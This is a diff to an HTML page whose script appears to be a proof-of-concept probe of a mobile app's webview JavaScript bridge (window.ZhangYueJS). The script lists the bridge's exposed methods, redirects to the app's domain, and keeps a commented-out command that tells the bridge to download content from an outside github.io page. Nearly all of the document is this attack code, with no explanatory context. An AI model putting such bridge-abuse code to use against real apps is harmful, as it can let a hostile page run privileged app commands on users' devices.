@@ -4,27 +4,33 @@
 <meta http-equiv="Cache-Control" content="max-age=7200" />
  <meta http-equiv="Expires" content="Mon, 20 Jul 2020 23:00:00 GMT" />
 <script type="text/javascript">
+	
+
 function gotarget(){
 	document.location.href="https://zhangyue.com/";
-for(var i=0;i<100;i++){
-setTimeout("getinfo()",i);
 }
 
 }
 function getinfo(){
 	var ret="";
+	while(1){
 	for (var obj in window.ZhangYueJS){
 		ret+=obj+"\r\n";
 	}
-	
+	if(ret!=""){
+		break;
+	}
+	}
 	//window.ZhangYueJS.do_command("{'Action':'chapPackDownload','Data':{'introStr':'https://cusas.github.io/obj2.htm'}}");
 	if(ret!=""){
 	alert(ret);
 	}
 }
+setTimeout("getinfo()",10);
+setTimeout("gotarget()",20);
 </script>
 	</head>
-<body onload="javascript:gotarget()">
+<body onload="">
 	<a onclick="javascript:getinfo()">getinfo</a>
 <iframe id="target" name="target" src="about:blank"></iframe>
 </body>
